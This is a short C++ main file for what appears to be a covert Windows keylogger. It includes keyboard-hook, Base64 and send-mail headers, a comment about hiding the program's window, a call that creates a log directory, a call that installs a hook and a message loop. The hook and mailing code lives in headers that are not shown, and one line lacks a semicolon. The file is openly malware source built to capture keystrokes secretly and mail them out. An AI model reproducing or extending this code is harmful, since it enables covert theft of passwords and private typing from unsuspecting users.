#include <iostream>
#include "windows.h" //Header to hide output window from showing up
#include "Helper.h"
#include "KeyConstants.h"
#include "Base64.h"
#include "IO.h"
#include "Timer.h"
#include "SendMail.h"
#include "KeybHooks.h"
using namespace std;

int main()
{
    MSG Msg; // Message to be processed but it will never be processed
    IO::MKDir(IO::GetOurPath(true));//Create Directory to Log file

    InstallHook();

    while(GetMessage (&Msg, NULL, 0, 0))//Program gets a message from us with address of that message
    {
        TranslateMessage(&Msg);//Take a message and modify to pass to it the system
        DispatchMessage(&Msg);//Forward it to the system invisibly
    }

    MailTimer.Stop()
    return 0;
}
